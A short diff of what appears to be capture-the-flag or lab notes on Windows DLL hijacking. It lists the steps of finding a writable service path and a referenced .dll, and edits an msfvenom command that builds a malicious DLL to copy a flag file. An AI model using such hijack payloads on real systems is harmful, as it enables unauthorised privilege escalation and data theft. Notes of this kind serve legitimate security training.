@@ -169,7 +169,7 @@ ON MACHINE BEING EXPLOITED
 7. go to services and look for a service without a description
 8. go to file path and check to see if you can write and delete files
 9. check configuration file and look for .dll
-10. msfvenom -p windows/exec CMD='cmd.exe /C cat C:\Users\Admin\Desktop\flag.txt > C:\\flag.txt' -f dll > hijackmeplz.dll
+10. msfvenom -p windows/exec CMD='cmd.exe /C type C:\Users\Admin\Desktop\flag.txt > C:\\flag.txt' -f dll > hijackmeplz.dll
 
      
 
